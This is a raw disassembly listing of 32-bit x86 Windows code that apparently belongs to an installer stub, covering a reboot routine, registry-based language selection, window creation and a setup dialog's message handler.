  403a6e:	4d                   	dec    %ebp
  403a6f:	75 99                	jne    0x403a0a
  403a71:	53                   	push   %ebx
  403a72:	56                   	push   %esi
  403a73:	e8 8a 28 00 00       	call   0x406302
  403a78:	e9 ca fe ff ff       	jmp    0x403947
  403a7d:	39 1d 14 a3 42 00    	cmp    %ebx,0x42a314
  403a83:	74 7c                	je     0x403b01
  403a85:	8d 44 24 14          	lea    0x14(%esp),%eax
  403a89:	50                   	push   %eax
  403a8a:	6a 28                	push   $0x28
  403a8c:	ff 15 e8 80 40 00    	call   *0x4080e8
  403a92:	50                   	push   %eax
  403a93:	ff 15 24 80 40 00    	call   *0x408024
  403a99:	85 c0                	test   %eax,%eax
  403a9b:	74 34                	je     0x403ad1
  403a9d:	8d 44 24 20          	lea    0x20(%esp),%eax
  403aa1:	50                   	push   %eax
  403aa2:	68 ec a2 40 00       	push   $0x40a2ec
  403aa7:	53                   	push   %ebx
  403aa8:	ff 15 20 80 40 00    	call   *0x408020
  403aae:	53                   	push   %ebx
  403aaf:	53                   	push   %ebx
  403ab0:	8d 44 24 24          	lea    0x24(%esp),%eax
  403ab4:	53                   	push   %ebx
  403ab5:	50                   	push   %eax
  403ab6:	53                   	push   %ebx
  403ab7:	ff 74 24 28          	push   0x28(%esp)
  403abb:	c7 44 24 34 01 00 00 	movl   $0x1,0x34(%esp)
  403ac2:	00 
  403ac3:	c7 44 24 40 02 00 00 	movl   $0x2,0x40(%esp)
  403aca:	00 
  403acb:	ff 15 1c 80 40 00    	call   *0x40801c
  403ad1:	6a 04                	push   $0x4
  403ad3:	e8 59 2e 00 00       	call   0x406931
  403ad8:	3b c3                	cmp    %ebx,%eax
  403ada:	be 02 00 04 80       	mov    $0x80040002,%esi
  403adf:	74 0c                	je     0x403aed
  403ae1:	56                   	push   %esi
  403ae2:	6a 25                	push   $0x25
  403ae4:	53                   	push   %ebx
  403ae5:	53                   	push   %ebx
  403ae6:	53                   	push   %ebx
  403ae7:	ff d0                	call   *%eax
  403ae9:	85 c0                	test   %eax,%eax
  403aeb:	74 0d                	je     0x403afa
  403aed:	56                   	push   %esi
  403aee:	6a 02                	push   $0x2
  403af0:	ff 15 34 82 40 00    	call   *0x408234
  403af6:	85 c0                	test   %eax,%eax
  403af8:	75 07                	jne    0x403b01
  403afa:	6a 09                	push   $0x9
  403afc:	e8 0a d9 ff ff       	call   0x40140b
  403b01:	a1 2c a3 42 00       	mov    0x42a32c,%eax
  403b06:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b09:	74 04                	je     0x403b0f
  403b0b:	89 44 24 10          	mov    %eax,0x10(%esp)
  403b0f:	ff 74 24 10          	push   0x10(%esp)
  403b13:	ff 15 e0 80 40 00    	call   *0x4080e0
  403b19:	a1 18 a0 40 00       	mov    0x40a018,%eax
  403b1e:	56                   	push   %esi
  403b1f:	8b 35 24 81 40 00    	mov    0x408124,%esi
  403b25:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b28:	74 0a                	je     0x403b34
  403b2a:	50                   	push   %eax
  403b2b:	ff d6                	call   *%esi
  403b2d:	83 0d 18 a0 40 00 ff 	orl    $0xffffffff,0x40a018
  403b34:	a1 1c a0 40 00       	mov    0x40a01c,%eax
  403b39:	83 f8 ff             	cmp    $0xffffffff,%eax
  403b3c:	74 0a                	je     0x403b48
  403b3e:	50                   	push   %eax
  403b3f:	ff d6                	call   *%esi
  403b41:	83 0d 1c a0 40 00 ff 	orl    $0xffffffff,0x40a01c
  403b48:	e8 29 00 00 00       	call   0x403b76
  403b4d:	6a 07                	push   $0x7
  403b4f:	68 00 80 43 00       	push   $0x438000
  403b54:	e8 f5 20 00 00       	call   0x405c4e
  403b59:	5e                   	pop    %esi
  403b5a:	c3                   	ret
  403b5b:	56                   	push   %esi
  403b5c:	8b 35 0c 17 42 00    	mov    0x42170c,%esi
  403b62:	eb 0a                	jmp    0x403b6e
  403b64:	ff 74 24 08          	push   0x8(%esp)
  403b68:	ff 56 04             	call   *0x4(%esi)
  403b6b:	8b 36                	mov    (%esi),%esi
  403b6d:	59                   	pop    %ecx
  403b6e:	85 f6                	test   %esi,%esi
  403b70:	75 f2                	jne    0x403b64
  403b72:	5e                   	pop    %esi
  403b73:	c2 04 00             	ret    $0x4
  403b76:	56                   	push   %esi
  403b77:	8b 35 0c 17 42 00    	mov    0x42170c,%esi
  403b7d:	6a 00                	push   $0x0
  403b7f:	e8 d7 ff ff ff       	call   0x403b5b
  403b84:	85 f6                	test   %esi,%esi
  403b86:	74 1a                	je     0x403ba2
  403b88:	57                   	push   %edi
  403b89:	8b fe                	mov    %esi,%edi
  403b8b:	8b 36                	mov    (%esi),%esi
  403b8d:	ff 77 08             	push   0x8(%edi)
  403b90:	ff 15 48 81 40 00    	call   *0x408148
  403b96:	57                   	push   %edi
  403b97:	ff 15 34 81 40 00    	call   *0x408134
  403b9d:	85 f6                	test   %esi,%esi
  403b9f:	75 e8                	jne    0x403b89
  403ba1:	5f                   	pop    %edi
  403ba2:	83 25 0c 17 42 00 00 	andl   $0x0,0x42170c
  403ba9:	5e                   	pop    %esi
  403baa:	c3                   	ret
  403bab:	a1 0c 17 42 00       	mov    0x42170c,%eax
  403bb0:	eb 0b                	jmp    0x403bbd
  403bb2:	8b 48 08             	mov    0x8(%eax),%ecx
  403bb5:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  403bb9:	74 0a                	je     0x403bc5
  403bbb:	8b 00                	mov    (%eax),%eax
  403bbd:	85 c0                	test   %eax,%eax
  403bbf:	75 f1                	jne    0x403bb2
  403bc1:	40                   	inc    %eax
  403bc2:	c2 04 00             	ret    $0x4
  403bc5:	33 c0                	xor    %eax,%eax
  403bc7:	eb f9                	jmp    0x403bc2
  403bc9:	56                   	push   %esi
  403bca:	8b 74 24 08          	mov    0x8(%esp),%esi
  403bce:	56                   	push   %esi
  403bcf:	e8 d7 ff ff ff       	call   0x403bab
  403bd4:	85 c0                	test   %eax,%eax
  403bd6:	75 03                	jne    0x403bdb
  403bd8:	40                   	inc    %eax
  403bd9:	eb 2c                	jmp    0x403c07
  403bdb:	6a 0c                	push   $0xc
  403bdd:	6a 40                	push   $0x40
  403bdf:	ff 15 38 81 40 00    	call   *0x408138
  403be5:	85 c0                	test   %eax,%eax
  403be7:	74 1b                	je     0x403c04
  403be9:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403bed:	89 70 08             	mov    %esi,0x8(%eax)
  403bf0:	89 48 04             	mov    %ecx,0x4(%eax)
  403bf3:	8b 0d 0c 17 42 00    	mov    0x42170c,%ecx
  403bf9:	89 08                	mov    %ecx,(%eax)
  403bfb:	a3 0c 17 42 00       	mov    %eax,0x42170c
  403c00:	33 c0                	xor    %eax,%eax
  403c02:	eb 03                	jmp    0x403c07
  403c04:	83 c8 ff             	or     $0xffffffff,%eax
  403c07:	5e                   	pop    %esi
  403c08:	c2 08 00             	ret    $0x8
  403c0b:	83 ec 10             	sub    $0x10,%esp
  403c0e:	53                   	push   %ebx
  403c0f:	55                   	push   %ebp
  403c10:	56                   	push   %esi
  403c11:	8b 35 74 a2 42 00    	mov    0x42a274,%esi
  403c17:	57                   	push   %edi
  403c18:	6a 02                	push   $0x2
  403c1a:	e8 12 2d 00 00       	call   0x406931
  403c1f:	33 ff                	xor    %edi,%edi
  403c21:	3b c7                	cmp    %edi,%eax
  403c23:	74 12                	je     0x403c37
  403c25:	ff d0                	call   *%eax
  403c27:	0f b7 c0             	movzwl %ax,%eax
  403c2a:	50                   	push   %eax
  403c2b:	68 00 70 43 00       	push   $0x437000
  403c30:	e8 4e 28 00 00       	call   0x406483
  403c35:	eb 5a                	jmp    0x403c91
  403c37:	bb 48 37 42 00       	mov    $0x423748,%ebx
  403c3c:	57                   	push   %edi
  403c3d:	53                   	push   %ebx
  403c3e:	57                   	push   %edi
  403c3f:	68 98 83 40 00       	push   $0x408398
  403c44:	68 01 00 00 80       	push   $0x80000001
  403c49:	66 c7 05 00 70 43 00 	movw   $0x30,0x437000
  403c50:	30 00 
  403c52:	66 c7 05 02 70 43 00 	movw   $0x78,0x437002
  403c59:	78 00 
  403c5b:	66 89 3d 04 70 43 00 	mov    %di,0x437004
  403c62:	e8 a3 27 00 00       	call   0x40640a
  403c67:	66 39 3d 48 37 42 00 	cmp    %di,0x423748
  403c6e:	75 16                	jne    0x403c86
  403c70:	57                   	push   %edi
  403c71:	53                   	push   %ebx
  403c72:	68 d4 83 40 00       	push   $0x4083d4
  403c77:	68 48 83 40 00       	push   $0x408348
  403c7c:	68 03 00 00 80       	push   $0x80000003
  403c81:	e8 84 27 00 00       	call   0x40640a
  403c86:	53                   	push   %ebx
  403c87:	68 00 70 43 00       	push   $0x437000
  403c8c:	e8 c7 28 00 00       	call   0x406558
  403c91:	e8 4b 02 00 00       	call   0x403ee1
  403c96:	a1 7c a2 42 00       	mov    0x42a27c,%eax
  403c9b:	bd 00 58 43 00       	mov    $0x435800,%ebp
  403ca0:	83 e0 20             	and    $0x20,%eax
  403ca3:	55                   	push   %ebp
  403ca4:	a3 00 a3 42 00       	mov    %eax,0x42a300
  403ca9:	c7 05 1c a3 42 00 00 	movl   $0x10000,0x42a31c
  403cb0:	00 01 00 
  403cb3:	e8 61 22 00 00       	call   0x405f19
  403cb8:	85 c0                	test   %eax,%eax
  403cba:	0f 85 8c 00 00 00    	jne    0x403d4c
  403cc0:	8b 4e 48             	mov    0x48(%esi),%ecx
  403cc3:	3b cf                	cmp    %edi,%ecx
  403cc5:	0f 84 81 00 00 00    	je     0x403d4c
  403ccb:	8b 56 4c             	mov    0x4c(%esi),%edx
  403cce:	a1 b8 a2 42 00       	mov    0x42a2b8,%eax
  403cd3:	bb 00 82 42 00       	mov    $0x428200,%ebx
  403cd8:	57                   	push   %edi
  403cd9:	8d 14 50             	lea    (%eax,%edx,2),%edx
  403cdc:	53                   	push   %ebx
  403cdd:	8d 04 48             	lea    (%eax,%ecx,2),%eax
  403ce0:	52                   	push   %edx
  403ce1:	50                   	push   %eax
  403ce2:	ff 76 44             	push   0x44(%esi)
  403ce5:	e8 20 27 00 00       	call   0x40640a
  403cea:	66 a1 00 82 42 00    	mov    0x428200,%ax
  403cf0:	66 3b c7             	cmp    %di,%ax
  403cf3:	74 57                	je     0x403d4c
  403cf5:	66 3d 22 00          	cmp    $0x22,%ax
  403cf9:	75 10                	jne    0x403d0b
  403cfb:	bb 02 82 42 00       	mov    $0x428202,%ebx
  403d00:	6a 22                	push   $0x22
  403d02:	53                   	push   %ebx
  403d03:	e8 36 21 00 00       	call   0x405e3e
  403d08:	66 89 38             	mov    %di,(%eax)
  403d0b:	53                   	push   %ebx
  403d0c:	e8 41 28 00 00       	call   0x406552
  403d11:	8d 44 43 f8          	lea    -0x8(%ebx,%eax,2),%eax
  403d15:	3b c3                	cmp    %ebx,%eax
  403d17:	76 26                	jbe    0x403d3f
  403d19:	68 bc a3 40 00       	push   $0x40a3bc
  403d1e:	50                   	push   %eax
  403d1f:	ff 15 28 81 40 00    	call   *0x408128
  403d25:	85 c0                	test   %eax,%eax
  403d27:	75 16                	jne    0x403d3f
  403d29:	53                   	push   %ebx
  403d2a:	ff 15 04 81 40 00    	call   *0x408104
  403d30:	83 f8 ff             	cmp    $0xffffffff,%eax
  403d33:	74 04                	je     0x403d39
  403d35:	a8 10                	test   $0x10,%al
  403d37:	75 06                	jne    0x403d3f
  403d39:	53                   	push   %ebx
  403d3a:	e8 1e 21 00 00       	call   0x405e5d
  403d3f:	53                   	push   %ebx
  403d40:	e8 cc 20 00 00       	call   0x405e11
  403d45:	50                   	push   %eax
  403d46:	55                   	push   %ebp
  403d47:	e8 f0 27 00 00       	call   0x40653c
  403d4c:	55                   	push   %ebp
  403d4d:	e8 c7 21 00 00       	call   0x405f19
  403d52:	85 c0                	test   %eax,%eax
  403d54:	75 0c                	jne    0x403d62
  403d56:	ff b6 18 01 00 00    	push   0x118(%esi)
  403d5c:	55                   	push   %ebp
  403d5d:	e8 17 28 00 00       	call   0x406579
  403d62:	68 40 80 00 00       	push   $0x8040
  403d67:	57                   	push   %edi
  403d68:	57                   	push   %edi
  403d69:	6a 01                	push   $0x1
  403d6b:	6a 67                	push   $0x67
  403d6d:	ff 35 60 a2 42 00    	push   0x42a260
  403d73:	ff 15 6c 82 40 00    	call   *0x40826c
  403d79:	a3 48 92 42 00       	mov    %eax,0x429248
  403d7e:	83 7e 50 ff          	cmpl   $0xffffffff,0x50(%esi)
  403d82:	bb 00 92 42 00       	mov    $0x429200,%ebx
  403d87:	74 7f                	je     0x403e08
  403d89:	8b 0d 60 a2 42 00    	mov    0x42a260,%ecx
  403d8f:	be b4 a3 40 00       	mov    $0x40a3b4,%esi
  403d94:	53                   	push   %ebx
  403d95:	c7 05 04 92 42 00 00 	movl   $0x401000,0x429204
  403d9c:	10 40 00 
  403d9f:	89 0d 10 92 42 00    	mov    %ecx,0x429210
  403da5:	a3 14 92 42 00       	mov    %eax,0x429214
  403daa:	89 35 24 92 42 00    	mov    %esi,0x429224
  403db0:	ff 15 1c 82 40 00    	call   *0x40821c
  403db6:	66 85 c0             	test   %ax,%ax
  403db9:	0f 84 18 01 00 00    	je     0x403ed7
  403dbf:	8d 44 24 10          	lea    0x10(%esp),%eax
  403dc3:	57                   	push   %edi
  403dc4:	50                   	push   %eax
  403dc5:	57                   	push   %edi
  403dc6:	6a 30                	push   $0x30
  403dc8:	ff 15 20 82 40 00    	call   *0x408220
  403dce:	57                   	push   %edi
  403dcf:	ff 35 60 a2 42 00    	push   0x42a260
  403dd5:	8b 44 24 24          	mov    0x24(%esp),%eax
  403dd9:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  403ddd:	57                   	push   %edi
  403dde:	57                   	push   %edi
  403ddf:	50                   	push   %eax
  403de0:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403de4:	2b 44 24 24          	sub    0x24(%esp),%eax
  403de8:	50                   	push   %eax
  403de9:	ff 74 24 2c          	push   0x2c(%esp)
  403ded:	ff 74 24 2c          	push   0x2c(%esp)
  403df1:	68 00 00 00 80       	push   $0x80000000
  403df6:	57                   	push   %edi
  403df7:	56                   	push   %esi
  403df8:	68 80 00 00 00       	push   $0x80
  403dfd:	ff 15 24 82 40 00    	call   *0x408224
  403e03:	a3 28 37 42 00       	mov    %eax,0x423728
  403e08:	57                   	push   %edi
  403e09:	e8 fd d5 ff ff       	call   0x40140b
  403e0e:	85 c0                	test   %eax,%eax
  403e10:	74 08                	je     0x403e1a
  403e12:	6a 02                	push   $0x2
  403e14:	58                   	pop    %eax
  403e15:	e9 bf 00 00 00       	jmp    0x403ed9
  403e1a:	e8 c2 00 00 00       	call   0x403ee1
  403e1f:	39 3d 20 a3 42 00    	cmp    %edi,0x42a320
  403e25:	0f 85 83 00 00 00    	jne    0x403eae
  403e2b:	6a 05                	push   $0x5
  403e2d:	ff 35 28 37 42 00    	push   0x423728
  403e33:	ff 15 50 82 40 00    	call   *0x408250
  403e39:	68 3c 83 40 00       	push   $0x40833c
  403e3e:	e8 7e 2a 00 00       	call   0x4068c1
  403e43:	85 c0                	test   %eax,%eax
  403e45:	75 0a                	jne    0x403e51
  403e47:	68 30 83 40 00       	push   $0x408330
  403e4c:	e8 70 2a 00 00       	call   0x4068c1
  403e51:	8b 35 28 82 40 00    	mov    0x408228,%esi
  403e57:	bd 18 83 40 00       	mov    $0x408318,%ebp
  403e5c:	53                   	push   %ebx
  403e5d:	55                   	push   %ebp
  403e5e:	57                   	push   %edi
  403e5f:	ff d6                	call   *%esi
  403e61:	85 c0                	test   %eax,%eax
  403e63:	75 16                	jne    0x403e7b
  403e65:	53                   	push   %ebx
  403e66:	68 04 83 40 00       	push   $0x408304
  403e6b:	57                   	push   %edi
  403e6c:	ff d6                	call   *%esi
  403e6e:	53                   	push   %ebx
  403e6f:	89 2d 24 92 42 00    	mov    %ebp,0x429224
  403e75:	ff 15 1c 82 40 00    	call   *0x40821c
  403e7b:	a1 40 92 42 00       	mov    0x429240,%eax
  403e80:	57                   	push   %edi
  403e81:	83 c0 69             	add    $0x69,%eax
  403e84:	68 b9 3f 40 00       	push   $0x403fb9
  403e89:	0f b7 c0             	movzwl %ax,%eax
  403e8c:	57                   	push   %edi
  403e8d:	50                   	push   %eax
  403e8e:	ff 35 60 a2 42 00    	push   0x42a260
  403e94:	ff 15 2c 82 40 00    	call   *0x40822c
  403e9a:	6a 05                	push   $0x5
  403e9c:	8b f0                	mov    %eax,%esi
  403e9e:	e8 68 d5 ff ff       	call   0x40140b
  403ea3:	6a 01                	push   $0x1
  403ea5:	e8 b1 fc ff ff       	call   0x403b5b
  403eaa:	8b c6                	mov    %esi,%eax
  403eac:	eb 2b                	jmp    0x403ed9
  403eae:	57                   	push   %edi
  403eaf:	e8 c3 17 00 00       	call   0x405677
  403eb4:	85 c0                	test   %eax,%eax
  403eb6:	74 18                	je     0x403ed0
  403eb8:	39 3d 2c 92 42 00    	cmp    %edi,0x42922c
  403ebe:	0f 85 4e ff ff ff    	jne    0x403e12
  403ec4:	6a 02                	push   $0x2
  403ec6:	e8 40 d5 ff ff       	call   0x40140b
  403ecb:	e9 42 ff ff ff       	jmp    0x403e12
  403ed0:	6a 01                	push   $0x1
  403ed2:	e8 34 d5 ff ff       	call   0x40140b
  403ed7:	33 c0                	xor    %eax,%eax
  403ed9:	5f                   	pop    %edi
  403eda:	5e                   	pop    %esi
  403edb:	5d                   	pop    %ebp
  403edc:	5b                   	pop    %ebx
  403edd:	83 c4 10             	add    $0x10,%esp
  403ee0:	c3                   	ret
  403ee1:	53                   	push   %ebx
  403ee2:	55                   	push   %ebp
  403ee3:	56                   	push   %esi
  403ee4:	57                   	push   %edi
  403ee5:	bf 00 70 43 00       	mov    $0x437000,%edi
  403eea:	bb ff ff 00 00       	mov    $0xffff,%ebx
  403eef:	57                   	push   %edi
  403ef0:	e8 a7 25 00 00       	call   0x40649c
  403ef5:	8b 35 c4 a2 42 00    	mov    0x42a2c4,%esi
  403efb:	85 f6                	test   %esi,%esi
  403efd:	74 45                	je     0x403f44
  403eff:	8b 0d 74 a2 42 00    	mov    0x42a274,%ecx
  403f05:	8b 49 64             	mov    0x64(%ecx),%ecx
  403f08:	8b d1                	mov    %ecx,%edx
  403f0a:	0f af ce             	imul   %esi,%ecx
  403f0d:	f7 da                	neg    %edx
  403f0f:	03 0d c0 a2 42 00    	add    0x42a2c0,%ecx
  403f15:	03 ca                	add    %edx,%ecx
  403f17:	4e                   	dec    %esi
  403f18:	66 8b 29             	mov    (%ecx),%bp
  403f1b:	66 33 e8             	xor    %ax,%bp
  403f1e:	23 eb                	and    %ebx,%ebp
  403f20:	66 85 ed             	test   %bp,%bp
  403f23:	74 06                	je     0x403f2b
  403f25:	85 f6                	test   %esi,%esi
  403f27:	75 ec                	jne    0x403f15
  403f29:	eb 19                	jmp    0x403f44
  403f2b:	8b 51 02             	mov    0x2(%ecx),%edx
  403f2e:	89 15 40 92 42 00    	mov    %edx,0x429240
  403f34:	8b 51 06             	mov    0x6(%ecx),%edx
  403f37:	89 15 28 a3 42 00    	mov    %edx,0x42a328
  403f3d:	8d 51 0a             	lea    0xa(%ecx),%edx
  403f40:	85 d2                	test   %edx,%edx
  403f42:	75 12                	jne    0x403f56
  403f44:	66 81 fb ff ff       	cmp    $0xffff,%bx
  403f49:	75 07                	jne    0x403f52
  403f4b:	bb ff 03 00 00       	mov    $0x3ff,%ebx
  403f50:	eb a3                	jmp    0x403ef5
  403f52:	33 db                	xor    %ebx,%ebx
  403f54:	eb 9f                	jmp    0x403ef5
  403f56:	89 15 3c 92 42 00    	mov    %edx,0x42923c
  403f5c:	0f b7 01             	movzwl (%ecx),%eax
  403f5f:	50                   	push   %eax
  403f60:	57                   	push   %edi
  403f61:	e8 1d 25 00 00       	call   0x406483
  403f66:	e8 2f 00 00 00       	call   0x403f9a
  403f6b:	a1 ac a2 42 00       	mov    0x42a2ac,%eax
  403f70:	8b 35 a8 a2 42 00    	mov    0x42a2a8,%esi
  403f76:	85 c0                	test   %eax,%eax
  403f78:	74 1b                	je     0x403f95
  403f7a:	8b f8                	mov    %eax,%edi
  403f7c:	8b 06                	mov    (%esi),%eax
  403f7e:	85 c0                	test   %eax,%eax
  403f80:	74 0a                	je     0x403f8c
  403f82:	50                   	push   %eax
  403f83:	8d 46 18             	lea    0x18(%esi),%eax
  403f86:	50                   	push   %eax
  403f87:	e8 ed 25 00 00       	call   0x406579
  403f8c:	81 c6 18 08 00 00    	add    $0x818,%esi
  403f92:	4f                   	dec    %edi
  403f93:	75 e7                	jne    0x403f7c
  403f95:	5f                   	pop    %edi
  403f96:	5e                   	pop    %esi
  403f97:	5d                   	pop    %ebp
  403f98:	5b                   	pop    %ebx
  403f99:	c3                   	ret
  403f9a:	56                   	push   %esi
  403f9b:	be 60 92 42 00       	mov    $0x429260,%esi
  403fa0:	6a fe                	push   $0xfffffffe
  403fa2:	56                   	push   %esi
  403fa3:	e8 d1 25 00 00       	call   0x406579
  403fa8:	56                   	push   %esi
  403fa9:	ff 35 28 37 42 00    	push   0x423728
  403faf:	ff 15 44 82 40 00    	call   *0x408244
  403fb5:	8b c6                	mov    %esi,%eax
  403fb7:	5e                   	pop    %esi
  403fb8:	c3                   	ret
  403fb9:	83 ec 10             	sub    $0x10,%esp
  403fbc:	b9 10 01 00 00       	mov    $0x110,%ecx
  403fc1:	53                   	push   %ebx
  403fc2:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  403fc6:	55                   	push   %ebp
  403fc7:	56                   	push   %esi
  403fc8:	3b d9                	cmp    %ecx,%ebx
  403fca:	57                   	push   %edi
  403fcb:	0f 84 3b 01 00 00    	je     0x40410c
  403fd1:	81 fb 08 04 00 00    	cmp    $0x408,%ebx
  403fd7:	0f 84 2f 01 00 00    	je     0x40410c
  403fdd:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403fe1:	33 ed                	xor    %ebp,%ebp
  403fe3:	83 fb 47             	cmp    $0x47,%ebx
  403fe6:	75 13                	jne    0x403ffb
  403fe8:	6a 13                	push   $0x13
  403fea:	55                   	push   %ebp
  403feb:	55                   	push   %ebp
  403fec:	55                   	push   %ebp
  403fed:	55                   	push   %ebp
  403fee:	57                   	push   %edi
  403fef:	ff 35 28 37 42 00    	push   0x423728
  403ff5:	ff 15 fc 81 40 00    	call   *0x4081fc
  403ffb:	83 fb 05             	cmp    $0x5,%ebx
  403ffe:	75 18                	jne    0x404018
  404000:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404004:	48                   	dec    %eax
  404005:	f7 d8                	neg    %eax
  404007:	1b c0                	sbb    %eax,%eax
  404009:	23 c3                	and    %ebx,%eax
  40400b:	50                   	push   %eax
  40400c:	ff 35 28 37 42 00    	push   0x423728
  404012:	ff 15 50 82 40 00    	call   *0x408250
  404018:	81 fb 0d 04 00 00    	cmp    $0x40d,%ebx
  40401e:	75 1a                	jne    0x40403a
  404020:	ff 35 38 92 42 00    	push   0x429238
  404026:	ff 15 38 82 40 00    	call   *0x408238
  40402c:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404030:	a3 38 92 42 00       	mov    %eax,0x429238
  404035:	e9 02 04 00 00       	jmp    0x40443c
  40403a:	83 fb 11             	cmp    $0x11,%ebx
  40403d:	75 11                	jne    0x404050
  40403f:	55                   	push   %ebp
  404040:	55                   	push   %ebp
  404041:	57                   	push   %edi
  404042:	ff 15 68 82 40 00    	call   *0x408268
  404048:	33 c0                	xor    %eax,%eax
  40404a:	40                   	inc    %eax
  40404b:	e9 11 04 00 00       	jmp    0x404461
  404050:	81 fb 11 01 00 00    	cmp    $0x111,%ebx
  404056:	0f 85 9d 00 00 00    	jne    0x4040f9
  40405c:	0f b7 74 24 2c       	movzwl 0x2c(%esp),%esi
  404061:	56                   	push   %esi
  404062:	57                   	push   %edi
  404063:	ff 15 64 82 40 00    	call   *0x408264
  404069:	8b f8                	mov    %eax,%edi
  40406b:	3b fd                	cmp    %ebp,%edi
  40406d:	74 1d                	je     0x40408c
  40406f:	55                   	push   %ebp
  404070:	55                   	push   %ebp
  404071:	68 f3 00 00 00       	push   $0xf3
  404076:	57                   	push   %edi
  404077:	ff 15 80 82 40 00    	call   *0x408280
  40407d:	57                   	push   %edi
  40407e:	ff 15 a0 81 40 00    	call   *0x4081a0
  404084:	85 c0                	test   %eax,%eax
  404086:	0f 84 d3 03 00 00    	je     0x40445f
  40408c:	83 fe 01             	cmp    $0x1,%esi
  40408f:	75 03                	jne    0x404094
  404091:	56                   	push   %esi
  404092:	eb 2e                	jmp    0x4040c2
  404094:	83 fe 03             	cmp    $0x3,%esi
  404097:	75 0c                	jne    0x4040a5
  404099:	39 2d 9c a3 40 00    	cmp    %ebp,0x40a39c
  40409f:	7e 3f                	jle    0x4040e0
  4040a1:	6a ff                	push   $0xffffffff
  4040a3:	eb 1d                	jmp    0x4040c2
  4040a5:	6a 02                	push   $0x2
  4040a7:	5f                   	pop    %edi
  4040a8:	3b f7                	cmp    %edi,%esi
  4040aa:	75 34                	jne    0x4040e0
  4040ac:	39 2d 0c a3 42 00    	cmp    %ebp,0x42a30c
  4040b2:	74 15                	je     0x4040c9
  4040b4:	57                   	push   %edi
  4040b5:	e8 51 d3 ff ff       	call   0x40140b
  4040ba:	89 3d 18 1f 42 00    	mov    %edi,0x421f18
  4040c0:	6a 78                	push   $0x78
  4040c2:	e8 a4 03 00 00       	call   0x40446b
  4040c7:	eb 30                	jmp    0x4040f9
  4040c9:	6a 03                	push   $0x3
  4040cb:	e8 3b d3 ff ff       	call   0x40140b
  4040d0:	85 c0                	test   %eax,%eax
  4040d2:	75 25                	jne    0x4040f9
  4040d4:	c7 05 18 1f 42 00 01 	movl   $0x1,0x421f18
  4040db:	00 00 00 
  4040de:	eb e0                	jmp    0x4040c0
  4040e0:	ff 74 24 30          	push   0x30(%esp)
  4040e4:	ff 74 24 30          	push   0x30(%esp)
  4040e8:	68 11 01 00 00       	push   $0x111
  4040ed:	ff 35 38 92 42 00    	push   0x429238
  4040f3:	ff 15 80 82 40 00    	call   *0x408280
  4040f9:	ff 74 24 30          	push   0x30(%esp)
  4040fd:	ff 74 24 30          	push   0x30(%esp)
  404101:	53                   	push   %ebx
  404102:	e8 f2 03 00 00       	call   0x4044f9
  404107:	e9 55 03 00 00       	jmp    0x404461
  40410c:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  404110:	8b 7c 24 24          	mov    0x24(%esp),%edi
  404114:	3b d9                	cmp    %ecx,%ebx
  404116:	a3 30 37 42 00       	mov    %eax,0x423730
  40411b:	75 4d                	jne    0x40416a
  40411d:	8b 35 64 82 40 00    	mov    0x408264,%esi
  404123:	6a 01                	push   $0x1
  404125:	57                   	push   %edi
  404126:	89 3d 68 a2 42 00    	mov    %edi,0x42a268
  40412c:	ff d6                	call   *%esi
  40412e:	6a 02                	push   $0x2
  404130:	57                   	push   %edi
  404131:	a3 44 37 42 00       	mov    %eax,0x423744
  404136:	ff d6                	call   *%esi
  404138:	6a ff                	push   $0xffffffff
  40413a:	6a 1c                	push   $0x1c
  40413c:	57                   	push   %edi
  40413d:	a3 10 17 42 00       	mov    %eax,0x421710
  404142:	e8 4b 03 00 00       	call   0x404492
  404147:	ff 35 48 92 42 00    	push   0x429248
  40414d:	6a f2                	push   $0xfffffff2
  40414f:	57                   	push   %edi
  404150:	ff 15 04 82 40 00    	call   *0x408204
  404156:	6a 04                	push   $0x4
  404158:	e8 ae d2 ff ff       	call   0x40140b
  40415d:	a3 2c 92 42 00       	mov    %eax,0x42922c
  404162:	33 c0                	xor    %eax,%eax
  404164:	40                   	inc    %eax
  404165:	a3 30 37 42 00       	mov    %eax,0x423730
  40416a:	8b 0d 9c a3 40 00    	mov    0x40a39c,%ecx
  404170:	33 ed                	xor    %ebp,%ebp
  404172:	8b f1                	mov    %ecx,%esi
  404174:	c1 e6 06             	shl    $0x6,%esi
  404177:	03 35 a0 a2 42 00    	add    0x42a2a0,%esi
  40417d:	3b cd                	cmp    %ebp,%ecx
  40417f:	7c 3e                	jl     0x4041bf
  404181:	83 f8 01             	cmp    $0x1,%eax
  404184:	75 31                	jne    0x4041b7
  404186:	55                   	push   %ebp
  404187:	ff 76 10             	push   0x10(%esi)
  40418a:	e8 fa d1 ff ff       	call   0x401389
  40418f:	85 c0                	test   %eax,%eax
  404191:	74 24                	je     0x4041b7
  404193:	6a 01                	push   $0x1
  404195:	55                   	push   %ebp
  404196:	68 0f 04 00 00       	push   $0x40f
  40419b:	ff 35 38 92 42 00    	push   0x429238
  4041a1:	ff 15 80 82 40 00    	call   *0x408280
  4041a7:	33 c0                	xor    %eax,%eax
  4041a9:	39 2d 2c 92 42 00    	cmp    %ebp,0x42922c
  4041af:	0f 94 c0             	sete   %al
  4041b2:	e9 aa 02 00 00       	jmp    0x404461
  4041b7:	39 2e                	cmp    %ebp,(%esi)
  4041b9:	0f 84 a0 02 00 00    	je     0x40445f
  4041bf:	68 0b 04 00 00       	push   $0x40b
  4041c4:	e8 15 03 00 00       	call   0x4044de
  4041c9:	a1 30 37 42 00       	mov    0x423730,%eax
  4041ce:	01 05 9c a3 40 00    	add    %eax,0x40a39c
  4041d4:	c1 e0 06             	shl    $0x6,%eax
  4041d7:	03 f0                	add    %eax,%esi
  4041d9:	a1 9c a3 40 00       	mov    0x40a39c,%eax
  4041de:	3b 05 a4 a2 42 00    	cmp    0x42a2a4,%eax
  4041e4:	75 07                	jne    0x4041ed
  4041e6:	6a 01                	push   $0x1
  4041e8:	e8 1e d2 ff ff       	call   0x40140b
  4041ed:	39 2d 2c 92 42 00    	cmp    %ebp,0x42922c
  4041f3:	0f 85 24 02 00 00    	jne    0x40441d
